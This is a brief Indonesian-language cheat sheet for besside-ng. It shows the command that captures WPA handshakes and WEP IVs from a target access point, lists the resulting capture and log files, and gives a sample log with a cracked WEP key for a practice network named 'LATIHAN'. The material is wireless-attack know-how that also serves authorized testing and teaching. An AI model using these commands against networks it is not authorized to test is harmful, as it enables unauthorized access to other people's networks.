# Besside-NG

#### Capture Handshake dan IVs:

```
sudo besside-ng -b [bssid] -c [channel] -vv [interface]
```

Output file yang dihasilkan:
- `wep.cap`: File yang digunakan untuk crack kunci WEP
- `wpa.cap`: File yang difunakan untuk crack kunci WPA/WPA2-PSK
- `besside.log`: File yang berisi kunci WEP yang berhasil di-crack
  
#### Melihat hasil cracking kunci WEP:

```
cat besside.log
```

Output:
```
# SSID              | KEY                                    | BSSID             | MAC filter
LATIHAN             | 31:31:31:31:31                         | 84:16:F9:FE:64:68 | 
```
